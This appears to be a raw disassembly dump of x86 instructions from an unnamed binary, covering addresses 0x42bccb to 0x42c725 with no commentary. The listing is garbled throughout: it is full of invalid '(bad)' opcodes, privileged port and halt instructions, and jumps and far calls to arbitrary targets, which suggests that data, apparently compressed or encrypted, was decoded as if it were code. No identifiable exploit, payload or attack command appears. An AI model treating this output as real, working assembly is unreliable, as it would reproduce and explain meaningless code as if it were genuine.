  42bccb:	xlat   BYTE PTR ds:[ebx]
  42bccc:	mov    ebp,0x7cfd3aa
  42bcd1:	adc    edi,esp
  42bcd3:	lods   eax,DWORD PTR ds:[esi]
  42bcd4:	(bad)  
  42bcd5:	or     ecx,esp
  42bcd7:	sbb    al,0x19
  42bcd9:	inc    esi
  42bcda:	rcl    DWORD PTR [edi+0x2b54fcfc],1
  42bce0:	nop
  42bce1:	mov    cl,0x65
  42bce3:	inc    esi
  42bce4:	sub    eax,0x9420ba4b
  42bce9:	inc    esp
  42bcea:	loope  0x42bd6b
  42bcec:	inc    eax
  42bced:	out    dx,eax
  42bcee:	and    eax,0xbdcaa159
  42bcf3:	mov    ecx,0xe1c5747a
  42bcf8:	or     dl,BYTE PTR [edi+0xe]
  42bcfb:	mov    ecx,0x96138607
  42bd00:	mov    al,0xe3
  42bd02:	ins    DWORD PTR es:[edi],dx
  42bd03:	scas   al,BYTE PTR es:[edi]
  42bd04:	sub    bl,BYTE PTR [ecx+0x6495d5a7]
  42bd0a:	mov    dl,0x24
  42bd0c:	pop    edx
  42bd0d:	in     eax,dx
  42bd0e:	xchg   DWORD PTR [ebx+eiz*2-0x70],esp
  42bd12:	or     ebp,DWORD PTR [edi+0x4]
  42bd15:	sar    BYTE PTR [ecx],cl
  42bd17:	push   0x230a9540
  42bd1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bd1d:	inc    edx
  42bd1e:	xchg   ebp,esp
  42bd20:	lods   eax,DWORD PTR ds:[esi]
  42bd21:	retf   0x8c80
  42bd24:	mov    cl,0xb4
  42bd26:	xor    edx,ecx
  42bd28:	add    ch,ah
  42bd2a:	icebp  
  42bd2b:	push   ss
  42bd2c:	cwde   
  42bd2d:	cmp    DWORD PTR [esp+ebx*1+0x2e],ebx
  42bd31:	rcr    dl,0x16
  42bd34:	popa   
  42bd35:	js     0x42bcf7
  42bd37:	pop    edx
  42bd38:	hlt    
  42bd39:	pop    esi
  42bd3a:	pop    ss
  42bd3b:	(bad)  
  42bd3c:	mov    BYTE PTR [esi+ebp*4],dl
  42bd3f:	dec    eax
  42bd40:	arpl   WORD PTR [eax],ax
	...
  42bdb2:	add    BYTE PTR [eax],al
  42bdb4:	mov    edi,0x4a8e4af7
  42bdb9:	mov    edi,0x5143f7ff
  42bdbe:	jne    0x42bdcc
  42bdc0:	cs arpl bx,dx
  42bdc3:	jg     0x42bdca
  42bdc5:	rol    BYTE PTR [ecx],1
  42bdc7:	add    ch,dh
  42bdc9:	add    BYTE PTR [eax],al
  42bdcb:	add    BYTE PTR [eax],dh
  42bdcd:	inc    eax
  42bdce:	jge    0x42bd68
  42bdd0:	xchg   eax,ebx
  42bdd2:	mov    al,ds:0xa6df1f36
  42bdd7:	jbe    0x42be25
  42bdd9:	in     eax,0xa7
  42bddb:	inc    esi
  42bddc:	pop    esp
  42bddd:	jge    0x42bdfb
  42bddf:	out    dx,al
  42bde0:	xor    ah,BYTE PTR [eax+0x3d758e6a]
  42bde6:	sahf   
  42bde7:	inc    ebp
  42bde8:	outs   dx,BYTE PTR ds:[esi]
  42bde9:	sub    dh,bh
  42bdeb:	mov    ecx,0x5325b257
  42bdf0:	jb     0x42be4c
  42bdf2:	pop    edi
  42bdf3:	shl    DWORD PTR [eax],0x51
  42bdf6:	sub    al,0x1a
  42bdf8:	mov    bh,ah
  42bdfa:	mov    esp,0xdd307c77
  42bdff:	mov    ds:0x938544d9,eax
  42be04:	js     0x42bd86
  42be06:	xchg   ecx,eax
  42be07:	js     0x42bddc
  42be09:	pusha  
  42be0a:	aam    0xf7
  42be0c:	inc    ebp
  42be0d:	(bad)  
  42be0f:	dec    ebp
  42be10:	sti    
  42be11:	sub    eax,0xa2f6c913
  42be16:	(bad)  
  42be17:	and    dh,BYTE PTR [ebp+eiz*8+0x0]
  42be1b:	test   eax,0x5b4c9cb2
  42be20:	sub    cl,BYTE PTR [ecx+0x2e]
  42be23:	call   0x6fa:0x3a48a86d
  42be2a:	lods   al,BYTE PTR ds:[esi]
  42be2b:	xchg   ecx,eax
  42be2c:	xchg   DWORD PTR [ebp+0x4d],ebx
  42be2f:	jne    0x42be5d
  42be31:	rcr    al,0xcc
  42be34:	test   al,0xf4
  42be36:	fcmovb st,st(0)
  42be38:	outs   dx,BYTE PTR ds:[esi]
  42be39:	ret    0x25f
  42be3c:	mov    WORD PTR [ebx+0x4fe077e6],fs
  42be42:	push   ds
  42be43:	jne    0x42be29
  42be45:	sbb    al,0x1c
  42be47:	push   es
  42be48:	rcr    ah,cl
  42be4a:	test   eax,0x9fa51911
  42be4f:	int3   
  42be50:	cmp    dh,BYTE PTR [eax-0x1274151]
  42be56:	std    
  42be57:	adc    BYTE PTR [edx+eiz*4+0xa08eac],0x34
  42be5f:	ds into 
  42be61:	sbb    DWORD PTR [esi],edi
  42be63:	ja     0x42be85
  42be65:	and    bl,dh
  42be67:	xor    al,0x8f
  42be69:	xor    eax,0xc1a798c5
  42be6e:	dec    ebp
  42be6f:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  42be71:	jno    0x42bece
  42be73:	hlt    
  42be74:	dec    eax
  42be75:	cdq    
  42be76:	call   0x85d4:0xd7031e21
  42be7d:	pop    ss
  42be7e:	das    
  42be7f:	shl    ch,1
  42be81:	and    DWORD PTR [eax+0x4aa3a265],eax
  42be87:	add    al,ah
  42be89:	jp     0x42be36
  42be8b:	loopne 0x42be6b
  42be8d:	mov    ebx,0xabeab241
  42be92:	dec    esp
  42be93:	adc    edx,DWORD PTR [ecx]
  42be95:	adc    BYTE PTR [edx-0x45],0x93
  42be99:	in     al,0x7d
  42be9b:	adc    ecx,0xffffff8b
  42be9e:	lea    ebx,[eax+0x4865bb26]
  42bea4:	hlt    
  42bea5:	push   esp
  42bea6:	fisubr WORD PTR [ebp+0x5067d71d]
  42beac:	cmp    BYTE PTR [eax],ch
  42beae:	ins    BYTE PTR es:[edi],dx
  42beaf:	pop    ebx
  42beb0:	mov    eax,0xf53d0fd1
  42beb5:	scas   eax,DWORD PTR es:[edi]
  42beb6:	cmp    edx,ebx
  42beb8:	push   ds
  42beb9:	mov    ds:0xc48acef3,eax
  42bebe:	sub    eax,0xb637
	...
  42bf33:	add    cl,bh
  42bf35:	enter  0xdc7a,0x7b
  42bf39:	(bad)  
  42bf3a:	(bad)  
  42bf3b:	in     eax,dx
  42bf3c:	out    dx,al
  42bf3d:	mov    ah,0x3
  42bf3f:	dec    ecx
  42bf40:	push   ecx
  42bf41:	mov    ds:0xd0fa8638,eax
  42bf46:	add    DWORD PTR [eax],eax
  42bf48:	cmc    
  42bf49:	add    BYTE PTR [eax],al
  42bf4b:	add    BYTE PTR [esi-0x25],cl
  42bf4e:	jecxz  0x42bf30
  42bf50:	cmc    
  42bf51:	lea    ebp,[ecx]
  42bf53:	out    0x21,al
  42bf55:	cwde   
  42bf56:	jnp    0x42bf1c
  42bf58:	ss addr16 (bad) 
  42bf5b:	adc    ebx,DWORD PTR [ebp+ebp*8+0x3f7dec20]
  42bf62:	ins    DWORD PTR es:[edi],dx
  42bf63:	ss inc edi
  42bf65:	inc    ebp
  42bf66:	jnp    0x42bf18
  42bf68:	xor    al,0x8a
  42bf6a:	push   edx
  42bf6b:	mov    esi,0x5fc6e978
  42bf70:	inc    esi
  42bf71:	retf   
  42bf72:	(bad)  
  42bf73:	sbb    BYTE PTR [eax+eax*2],ah
  42bf76:	stos   BYTE PTR es:[edi],al
  42bf77:	popf   
  42bf78:	push   edx
  42bf79:	add    eax,0x82dd92b3
  42bf7e:	add    al,0x23
  42bf80:	inc    ecx
  42bf81:	test   ecx,ebp
  42bf83:	push   edx
  42bf84:	xor    edx,DWORD PTR [ebp+eiz*8+0xf]
  42bf88:	test   eax,0x59e97820
  42bf8d:	dec    ebx
  42bf8e:	nop
  42bf8f:	mov    edx,0x50a34fb1
  42bf94:	pop    edx
  42bf95:	pop    esi
  42bf96:	adc    eax,0xed7d286d
  42bf9b:	inc    esi
  42bf9c:	imul   edi,ecx,0x4c
  42bf9f:	push   ebx
  42bfa0:	cs mov esi,0x67737f6a
  42bfa6:	jl     0x42bf3f
  42bfa8:	pop    ss
  42bfa9:	shr    BYTE PTR [edx+0x2b],1
  42bfac:	loope  0x42bf2f
  42bfae:	outs   dx,DWORD PTR ds:[esi]
  42bfaf:	daa    
  42bfb0:	cli    
  42bfb1:	jbe    0x42bf9a
  42bfb3:	pop    ebp
  42bfb4:	mov    ebx,0x3d60d4b8
  42bfb9:	fdiv   st,st(6)
  42bfbb:	(bad)  
  42bfbc:	lods   eax,DWORD PTR ds:[esi]
  42bfbd:	shl    BYTE PTR [esi+0x2fcb6f4f],0xaa
  42bfc4:	jbe    0x42bfe2
  42bfc6:	mov    esp,0xd6cc3bc6
  42bfcb:	add    esp,DWORD PTR [ebp+0x7]
  42bfce:	inc    ebx
  42bfcf:	ins    DWORD PTR es:[edi],dx
  42bfd0:	mov    ebx,0xc05a9809
  42bfd5:	sub    al,0xa7
  42bfd7:	and    eax,0x3bd302d
  42bfdc:	loopne 0x42bf94
  42bfde:	add    DWORD PTR [ebp-0x1f964ebc],0xfffffffc
  42bfe5:	out    0x26,eax
  42bfe7:	fst    DWORD PTR [ebx-0x75]
  42bfea:	push   edi
  42bfeb:	and    DWORD PTR [ebx+0x1a74f031],esp
  42bff1:	xor    ch,ah
  42bff3:	or     BYTE PTR [edi],ah
  42bff5:	add    DWORD PTR [ebp+0x6e859040],ebp
  42bffb:	jno    0x42c01a
  42bffd:	ja     0x42bf7f
  42bfff:	out    0xe5,eax
  42c001:	(bad)  
  42c002:	jns    0x42c065
  42c004:	cmp    eax,0x6ae5f6fa
  42c009:	lahf   
  42c00a:	add    DWORD PTR [ecx+0x76],esi
  42c00d:	mov    dh,0x12
  42c00f:	clc    
  42c010:	mov    dl,0xdb
  42c012:	arpl   WORD PTR [ebx-0x4389ea0],bx
  42c018:	ds mov edi,0xb4f24d35
  42c01e:	mov    cl,0x92
  42c020:	push   0xa9293942
  42c025:	adc    BYTE PTR [esp+ecx*4+0x6de5e566],al
  42c02c:	mov    edi,0xe5c766d7
  42c031:	xchg   DWORD PTR [edi-0x150203b5],esp
  42c037:	es loope 0x42c0b7
  42c03a:	(bad)
  42c03e:	mov    ds:0xb151,eax
	...
  42c0b3:	add    BYTE PTR [ebp+0x25],dh
  42c0b6:	imul   ebx,DWORD PTR [edi-0x51]
  42c0ba:	cmc    
  42c0bb:	(bad)  
  42c0bc:	call   0x88942915
  42c0c1:	cmp    bh,ch
  42c0c3:	cmp    edi,ebp
  42c0c5:	rol    DWORD PTR [ecx],1
  42c0c7:	add    ch,dh
  42c0c9:	add    BYTE PTR [eax],al
  42c0cb:	add    BYTE PTR [edi],dl
  42c0cd:	dec    esp
  42c0ce:	enter  0xe37f,0x75
  42c0d2:	imul   esi,DWORD PTR ds:0x1b68500b,0x592ed76e
  42c0dc:	push   ecx
  42c0dd:	ins    BYTE PTR es:[edi],dx
  42c0de:	es push 0x6a
  42c0e1:	add    eax,0x16a0b745
  42c0e6:	xchg   esi,eax
  42c0e7:	test   BYTE PTR [ecx],0x6c
  42c0ea:	mov    ds:0xfff647c1,eax
  42c0ef:	inc    edx
  42c0f0:	aam    0x57
  42c0f2:	ins    DWORD PTR es:[edi],dx
  42c0f3:	lods   eax,DWORD PTR ds:[esi]
  42c0f4:	inc    ebx
  42c0f5:	inc    esp
  42c0f6:	jle    0x42c166
  42c0f8:	fnstsw WORD PTR [edi]
  42c0fa:	mov    ch,0x9e
  42c0fc:	jo     0x42c13c
  42c0fe:	js     0x42c0f7
  42c100:	dec    eax
  42c101:	mov    WORD PTR [ebx+0x1b71beb1],?
  42c107:	into   
  42c108:	add    al,BYTE PTR [esi+0x67]
  42c10b:	cmp    dl,BYTE PTR [esi+0x603c29ba]
  42c111:	out    0x13,al
  42c113:	add    WORD PTR [edi-0x21],cx
  42c117:	mov    eax,fs:0x739b2c1b
  42c11d:	mov    ds:0x9003dc8e,al
  42c122:	stos   DWORD PTR es:[edi],eax
  42c123:	adc    DWORD PTR [ecx+0x29],edx
  42c126:	int3   
  42c127:	retf   0x4186
  42c12a:	push   esi
  42c12b:	loop   0x42c120
  42c12d:	pushf  
  42c12e:	jle    0x42c112
  42c130:	or     ah,ah
  42c132:	test   BYTE PTR [ebx],cl
  42c134:	ja     0x42c167
  42c136:	scas   eax,DWORD PTR es:[edi]
  42c137:	fmul   st,st(1)
  42c139:	cmp    DWORD PTR fs:[edx],edx
  42c13c:	lods   eax,DWORD PTR ds:[esi]
  42c13d:	out    dx,al
  42c13e:	je     0x42c1ad
  42c140:	mov    DWORD PTR [esi],edi
  42c142:	dec    ebp
  42c143:	jg     0x42c0fa
  42c145:	mov    cl,0xef
  42c147:	ret    0x13c6
  42c14a:	aam    0x4a
  42c14c:	loope  0x42c189
  42c14e:	xor    eax,0x264195b8
  42c153:	jmp    0x42c1ac
  42c155:	pop    ebx
  42c156:	popf   
  42c157:	lock (bad) 
  42c159:	arpl   cx,dx
  42c15b:	mov    dh,0x43
  42c15d:	mov    DWORD PTR [eax-0x50],edx
  42c160:	xchg   edi,eax
  42c161:	cli    
  42c162:	int    0x5f
  42c164:	mov    ds,esi
  42c166:	xchg   esp,eax
  42c167:	and    BYTE PTR cs:[esi+0x6b],0xd3
  42c16c:	and    DWORD PTR [edi-0x28],esi
  42c16f:	mov    bl,0xfa
  42c171:	rcr    edx,1
  42c173:	sub    al,0x61
  42c175:	(bad)  
  42c176:	cmp    al,0x4f
  42c178:	cmc    
  42c179:	inc    ecx
  42c17a:	shl    ebx,cl
  42c17c:	sub    ecx,edi
  42c17e:	xchg   ebx,eax
  42c17f:	sbb    esp,ebp
  42c181:	jl     0x42c191
  42c183:	fbstp  TBYTE PTR [ebp+0x51cb0f3e]
  42c189:	and    bp,0x20
  42c18d:	pop    edi
  42c18e:	pop    ecx
  42c18f:	xor    ecx,DWORD PTR [ebx-0x2f]
  42c192:	lods   eax,DWORD PTR ds:[esi]
  42c193:	stos   DWORD PTR es:[edi],eax
  42c194:	in     eax,dx
  42c195:	jle    0x42c188
  42c197:	jne    0x42c1cc
  42c199:	inc    ecx
  42c19a:	pop    esi
  42c19b:	in     eax,dx
  42c19c:	enter  0x7e2,0x47
  42c1a0:	sbb    eax,0x15286170
  42c1a5:	bound  ebp,QWORD PTR [eax-0x6b]
  42c1a8:	cmp    DWORD PTR ss:[esi-0x6c38696a],ecx
  42c1af:	ds pop edx
  42c1b1:	test   al,0xfd
  42c1b3:	inc    ebx
  42c1b4:	test   al,0x75
  42c1b6:	add    DWORD PTR fs:[esi-0x367221a3],0x1b8d1ad9
	...
  42c231:	add    BYTE PTR [eax],al
  42c233:	add    BYTE PTR [ebp-0x449f6672],ah
  42c239:	ja     0x42c238
  42c23b:	iret   
  42c23c:	xchg   esp,eax
  42c23d:	xor    edx,DWORD PTR [ecx+ebp*1+0x56]
  42c241:	fisub  WORD PTR [esi]
  42c243:	hlt    
  42c244:	in     al,0xd2
  42c246:	add    DWORD PTR [eax],eax
  42c248:	cmc    
  42c249:	add    BYTE PTR [eax],al
  42c24b:	add    BYTE PTR [eax],dh
  42c24d:	in     al,dx
  42c24e:	push   ebp
  42c24f:	or     al,0x9e
  42c251:	out    dx,al
  42c252:	loope  0x42c203
  42c254:	cli    
  42c255:	xchg   BYTE PTR [eax],cl
  42c257:	push   ds
  42c258:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c259:	addr16 inc edi
  42c25b:	jnp    0x42c23f
  42c25d:	cmp    DWORD PTR [eax-0x1ec55f52],0xc5689cb
  42c267:	mov    esi,0x6713c6fb
  42c26c:	mov    ecx,0x33e0e157
  42c271:	push   es
  42c272:	popf   
  42c273:	adc    BYTE PTR [esi+edi*4-0x5],cl
  42c277:	or     al,BYTE PTR [eax-0x43147894]
  42c27d:	push   ebp
  42c27e:	pop    esp
  42c27f:	push   esp
  42c280:	and    eax,DWORD PTR [ebp+0x23]
  42c283:	mov    ebp,0x2989e6b6
  42c288:	adc    bl,dh
  42c28a:	(bad)  
  42c28b:	sub    DWORD PTR [esi],ebp
  42c28d:	inc    ecx
  42c28e:	mov    ah,0x57
  42c290:	adc    BYTE PTR [edx-0x5e7ba757],dl
  42c296:	sub    al,0xec
  42c298:	mov    edi,es
  42c29a:	xor    eax,0xc969bf2a
  42c29f:	enter  0x8537,0x77
  42c2a3:	retf   
  42c2a4:	add    DWORD PTR [eax],0x75
  42c2a7:	imul   ebp,ebp,0xffffffb7
  42c2aa:	inc    ecx
  42c2ab:	sar    DWORD PTR [edi+0x50],1
  42c2ae:	add    dl,0x45
  42c2b1:	adc    bl,dl
  42c2b3:	in     eax,dx
  42c2b4:	xor    BYTE PTR [ebp+0x49282168],0xf1
  42c2bb:	mov    al,ds:0xe04ca64f
  42c2c0:	ja     0x42c258
  42c2c2:	pop    ss
  42c2c3:	push   0xffffffb0
  42c2c5:	stc    
  42c2c6:	and    eax,0xe07db0a4
  42c2cb:	or     eax,0xa1448fc9
  42c2d0:	add    DWORD PTR [ebx-0x7e],eax
  42c2d3:	push   edx
  42c2d4:	retf   
  42c2d5:	jecxz  0x42c2fb
  42c2d7:	cmp    esi,DWORD PTR [eax-0x383c2c7c]
  42c2dd:	xchg   ebx,eax
  42c2de:	imul   edx,DWORD PTR [edi],0xe9732d8f
  42c2e4:	lods   eax,DWORD PTR ds:[esi]
  42c2e5:	inc    ebp
  42c2e6:	dec    edx
  42c2e7:	push   eax
  42c2e8:	ret    
  42c2e9:	xchg   esp,eax
  42c2ea:	dec    al
  42c2ec:	(bad)  
  42c2ed:	pop    ecx
  42c2ee:	xor    DWORD PTR [esi],ebx
  42c2f0:	adc    eax,0xc059ee61
  42c2f5:	pop    ebx
  42c2f6:	test   eax,0xb8cd3044
  42c2fb:	test   DWORD PTR [esi],ebp
  42c2fd:	data16 stos BYTE PTR es:[edi],al
  42c2ff:	inc    ebx
  42c300:	aam    0xce
  42c302:	mov    ds:0x9cae4c24,al
  42c307:	jns    0x42c337
  42c309:	and    DWORD PTR [esi+0x2cc5e7e],esp
  42c30f:	outs   dx,BYTE PTR ds:[esi]
  42c310:	xchg   BYTE PTR [ecx+0x1897d320],dh
  42c316:	push   ss
  42c317:	(bad)  
  42c318:	aam    0xf5
  42c31a:	xor    esp,DWORD PTR [ebx-0x2cd31b7f]
  42c320:	push   eax
  42c321:	jno    0x42c2fe
  42c323:	ja     0x42c328
  42c325:	xchg   edx,eax
  42c326:	popf   
  42c327:	push   ss
  42c328:	xchg   ebx,eax
  42c329:	jmp    0xdf65f806
  42c32e:	xchg   dh,dh
  42c330:	test   al,0x81
  42c332:	fdivr  st(4),st
  42c334:	test   al,0x1e
  42c336:	jge    0x42c371
  42c338:	out    dx,eax
  42c339:	daa    
  42c33a:	setle  BYTE PTR [ebx]
  42c33d:	jg     0x42c2e4
  42c33f:	call   0x42c376
	...
  42c3b4:	mov    al,BYTE PTR [ebp+0x20]
  42c3b7:	out    dx,al
  42c3b8:	out    dx,eax
  42c3b9:	out    dx,eax
  42c3ba:	into   
  42c3bb:	gs aam 0xa
  42c3be:	fst    DWORD PTR [ecx-0x61]
  42c3c1:	mov    ebx,0xd3d9eacd
  42c3c6:	add    DWORD PTR [eax],eax
  42c3c8:	cmc    
  42c3c9:	add    BYTE PTR [eax],al
  42c3cb:	add    BYTE PTR [edi-0x1b],ch
  42c3ce:	imul   esi
  42c3d0:	sbb    esp,esi
  42c3d2:	rol    DWORD PTR [ebx+0x5c134cdc],0x2
  42c3d9:	iret   
  42c3da:	retf   
  42c3db:	fcmovb st,st(2)
  42c3dd:	and    DWORD PTR [edx],edi
  42c3df:	sbb    ch,bl
  42c3e1:	enter  0x2010,0x4b
  42c3e5:	or     al,0x8e
  42c3e7:	cmp    DWORD PTR [esi],ecx
  42c3e9:	sub    eax,0x9fbdf53
  42c3ee:	dec    edx
  42c3ef:	arpl   sp,sp
  42c3f1:	in     eax,dx
  42c3f2:	push   ebx
  42c3f3:	xor    ch,BYTE PTR [eax+ebp*4]
  42c3f6:	int    0x7d
  42c3f8:	call   0x2639:0xab7ae6e
  42c3ff:	jbe    0x42c402
  42c401:	cmp    al,0x24
  42c403:	int    0x1f
  42c405:	fnsave [eax-0x2131dda0]
  42c40b:	les    esi,FWORD PTR [esi-0x3d]
  42c40e:	in     al,0x8f
  42c410:	dec    esi
  42c411:	in     al,dx
  42c412:	aad    0x1c
  42c414:	scas   al,BYTE PTR es:[edi]
  42c415:	xchg   ebp,eax
  42c416:	icebp  
  42c417:	std    
  42c418:	test   eax,0x9c686825
  42c41d:	xchg   ecx,eax
  42c41e:	js     0x42c3ac
  42c420:	retf   
  42c421:	or     DWORD PTR [ebx],esp
  42c423:	jp     0x42c472
  42c425:	adc    ebx,DWORD PTR [edx-0x95ae7d3]
  42c42b:	sub    al,0x9f
  42c42d:	xor    DWORD PTR ds:0x7c7dc90c,ecx
  42c433:	mov    esi,DWORD PTR [edi-0x12]
  42c436:	popa   
  42c437:	pop    esi
  42c438:	push   ebp
  42c439:	jp     0x42c4ba
  42c43b:	fst    DWORD PTR [esi+0x767912fd]
  42c441:	jmp    FWORD PTR [edi+0x2e60afb5]
  42c447:	cmp    BYTE PTR [edx-0x1],bl
  42c44a:	out    0xe9,al
  42c44c:	arpl   cx,di
  42c44e:	imul   esp,DWORD PTR fs:[eax],0x267df7c2
  42c455:	test   eax,0x62302ff4
  42c45a:	push   edi
  42c45b:	stos   BYTE PTR es:[edi],al
  42c45c:	pop    esi
  42c45d:	outs   dx,BYTE PTR ds:[esi]
  42c45e:	nop
  42c45f:	sub    BYTE PTR [eax+0x5782e1d],bh
  42c465:	and    esp,edi
  42c467:	mov    esi,0x2883853
  42c46c:	dec    edx
  42c46d:	push   ebp
  42c46e:	add    al,0xfe
  42c470:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c471:	pop    esp
  42c472:	jne    0x42c4b4
  42c474:	sbb    al,0x1c
  42c476:	sti    
  42c477:	rcr    DWORD PTR [eax+0x21],1
  42c47a:	jecxz  0x42c4b7
  42c47c:	sub    BYTE PTR [ebp+0x6b],dh
  42c47f:	lods   al,BYTE PTR ds:[esi]
  42c480:	out    0x22,eax
  42c482:	or     eax,0x9fe0f800
  42c487:	jae    0x42c46d
  42c489:	cs push 0xbe399897
  42c48f:	sar    BYTE PTR [ebx+0x3796c57f],cl
  42c495:	fs out dx,eax
  42c497:	out    0x31,eax
  42c499:	adc    al,0xa6
  42c49b:	sbb    esi,DWORD PTR ds:0x2611d88b
  42c4a1:	(bad)  
  42c4a2:	fadd   QWORD PTR [esi]
  42c4a4:	(bad)  
  42c4a5:	out    dx,eax
  42c4a6:	lea    esp,[ebx+0x6b]
  42c4a9:	sub    DWORD PTR [edx-0x36b72661],edx
  42c4af:	sub    al,0x2b
  42c4b1:	sub    BYTE PTR [edi+0x40],dh
  42c4b4:	loopne 0x42c451
  42c4b6:	in     eax,0xa7
  42c4b8:	mov    ds:0x56e6f92d,eax
  42c4bd:	mov    bh,0x7e
  42c4bf:	xchg   esi,eax
  42c4c0:	or     al,BYTE PTR [eax]
	...
  42c532:	add    BYTE PTR [eax],al
  42c534:	loopne 0x42c4ca
  42c536:	and    bh,cl
  42c538:	je     0x42c539
  42c53a:	out    dx,eax
  42c53b:	mov    edi,0x9a7cd6c5
  42c540:	test   ah,0x6f
  42c543:	adc    ecx,esi
  42c545:	aam    0x1
  42c547:	add    ch,dh
  42c549:	add    BYTE PTR [eax],al
  42c54b:	add    BYTE PTR [ebx],ah
  42c54d:	(bad)  
  42c54e:	ss sbb ch,cl
  42c551:	rcl    BYTE PTR ss:[esi-0x45],0x22
  42c556:	ss xchg ebp,eax
  42c558:	xchg   ebp,eax
  42c559:	sahf   
  42c55a:	je     0x42c577
  42c55c:	(bad)  
  42c55e:	stos   DWORD PTR es:[edi],eax
  42c55f:	mov    ebx,0x27ccfeaa
  42c564:	xor    edx,DWORD PTR [ecx+0x62674a60]
  42c56a:	fild   DWORD PTR [eax]
  42c56c:	dec    esp
  42c56d:	push   edx
  42c56e:	loopne 0x42c59e
  42c570:	mov    esp,0xf325409a
  42c575:	mov    ebx,DWORD PTR [eax-0x50]
  42c578:	icebp  
  42c579:	pop    ecx
  42c57a:	or     bl,BYTE PTR cs:[edi+0x39a84ad7]
  42c581:	lods   eax,DWORD PTR ds:[esi]
  42c582:	scas   eax,DWORD PTR es:[edi]
  42c583:	push   ebx
  42c584:	movd   DWORD PTR [eax+edx*1],mm7
  42c588:	sti    
  42c589:	xchg   BYTE PTR [eax-0x11],dl
  42c58c:	inc    esp
  42c58d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c58e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c58f:	aam    0x4e
  42c591:	sub    bh,BYTE PTR [ecx+0x2888a974]
  42c597:	mov    bh,0x94
  42c599:	ret    
  42c59a:	push   edi
  42c59b:	add    DWORD PTR [edx],esi
  42c59d:	call   0xd2390ca7
  42c5a2:	gs dec edi
  42c5a4:	imul   eax,DWORD PTR [ecx+0x4e317f4e],0xffffff89
  42c5ab:	sbb    BYTE PTR [eax+0x49d67071],al
  42c5b1:	jne    0x42c5c6
  42c5b3:	shr    DWORD PTR [edi],cl
  42c5b5:	jle    0x42c569
  42c5b7:	nop
  42c5b8:	(bad)  
  42c5b9:	(bad)  
  42c5ba:	jb     0x42c580
  42c5bc:	mov    ds:0xbd7e2f2f,al
  42c5c1:	cwde   
  42c5c2:	add    DWORD PTR [eax+0x15],0x43fbacfd
  42c5c9:	test   BYTE PTR [esi+0x23],0x3c
  42c5cd:	inc    ebp
  42c5ce:	xchg   ecx,eax
  42c5cf:	ds jp  0x42c5e3
  42c5d2:	xlat   BYTE PTR ds:[ebx]
  42c5d3:	popa   
  42c5d4:	loope  0x42c605
  42c5d6:	stos   DWORD PTR es:[edi],eax
  42c5d7:	loop   0x42c562
  42c5d9:	fisub  WORD PTR [esi+eax*2+0x57]
  42c5dd:	mov    BYTE PTR [ebp+0x60],0x5
  42c5e1:	repnz test al,0xcc
  42c5e4:	push   ss
  42c5e5:	pusha  
  42c5e6:	in     al,dx
  42c5e7:	clc    
  42c5e8:	jmp    0xb3f7:0x38f976e1
  42c5ef:	je     0x42c5ea
  42c5f1:	or     al,0x32
  42c5f3:	push   edx
  42c5f4:	pop    ss
  42c5f5:	mov    al,ds:0xdd8a09b4
  42c5fa:	pusha  
  42c5fb:	dec    ecx
  42c5fc:	mov    al,ds:0x178ef1a2
  42c601:	std    
  42c602:	jnp    0x42c649
  42c604:	jo     0x42c5a0
  42c606:	jnp    0x42c5ac
  42c608:	mov    dl,0x9d
  42c60a:	inc    esi
  42c60b:	loope  0x42c5c2
  42c60d:	sbb    DWORD PTR fs:[edi-0x7c],0xffffffb1
  42c612:	ror    ah,1
  42c614:	pop    edi
  42c615:	ss adc al,0x59
  42c618:	adc    DWORD PTR [ecx+0x6452652],ebp
  42c61e:	push   ebx
  42c61f:	scas   eax,DWORD PTR es:[edi]
  42c620:	sti    
  42c621:	pop    ebp
  42c623:	rcr    BYTE PTR [ebp-0x28],1
  42c626:	xlat   BYTE PTR ds:[ebx]
  42c627:	inc    ecx
  42c628:	jbe    0x42c67d
  42c62a:	jl     0x42c688
  42c62c:	fiadd  DWORD PTR [eax+0x1f]
  42c62f:	and    dl,BYTE PTR [ecx+0x17]
  42c632:	sar    BYTE PTR [edx+0x13],1
  42c635:	dec    edx
  42c636:	in     al,0xdb
  42c638:	gs or  esi,ecx
  42c63b:	dec    ebx
  42c63c:	xchg   DWORD PTR [ebp+0xa4950c],ebp
	...
  42c6b2:	add    BYTE PTR [eax],al
  42c6b4:	dec    esi
  42c6b5:	inc    edx
  42c6b6:	dec    ecx
  42c6b7:	daa    
  42c6b8:	dec    ebp
  42c6b9:	das    
  42c6ba:	outs   dx,BYTE PTR ds:[esi]
  42c6bb:	imul   ebp,esi,0x7b
  42c6be:	enter  0x5fbe,0x33
  42c6c2:	ds dec ecx
  42c6c4:	ret    
  42c6c5:	aad    0x1
  42c6c7:	add    ch,dh
  42c6c9:	add    BYTE PTR [eax],al
  42c6cb:	add    BYTE PTR [eax+eax*4-0x348bf4eb],al
  42c6d2:	test   al,0xdb
  42c6d4:	jne    0x42c72f
  42c6d6:	mov    ds:0xcb16c299,eax
  42c6db:	mov    WORD PTR [edx-0x63],gs
  42c6de:	inc    ebp
  42c6df:	push   ebp
  42c6e0:	dec    eax
  42c6e2:	mov    esp,0x3861b19c
  42c6e7:	(bad)  
  42c6e8:	mov    ebx,0x3de2a9cf
  42c6ed:	in     eax,0x30
  42c6ef:	fcomip st,st(4)
  42c6f1:	jecxz  0x42c734
  42c6f3:	add    al,0xcd
  42c6f5:	test   dl,dl
  42c6f7:	test   eax,0xd2da20a0
  42c6fc:	gs jle 0x42c76a
  42c6ff:	push   ecx
  42c700:	pop    esi
  42c701:	push   ebx
  42c702:	sahf   
  42c703:	retf   
  42c704:	cdq    
  42c705:	in     eax,0xcd
  42c707:	push   esi
  42c708:	sbb    DWORD PTR [eax-0x42],esi
  42c70b:	add    eax,0xee87beac
  42c710:	push   ebx
  42c711:	and    esi,DWORD PTR [edx-0x39]
  42c714:	jecxz  0x42c73f
  42c716:	dec    ebp
  42c717:	ret    
  42c718:	jg     0x42c6c2
  42c71a:	loop   0x42c751
  42c71c:	pop    es
  42c71d:	popf   
  42c71e:	push   edi
  42c71f:	fmul   QWORD PTR [esi]
  42c721:	leave  
  42c722:	sub    DWORD PTR [ebx],eax
  42c724:	stos   BYTE PTR es:[edi],al
  42c725:	and    ah,BYTE PTR [edi+edx*1]
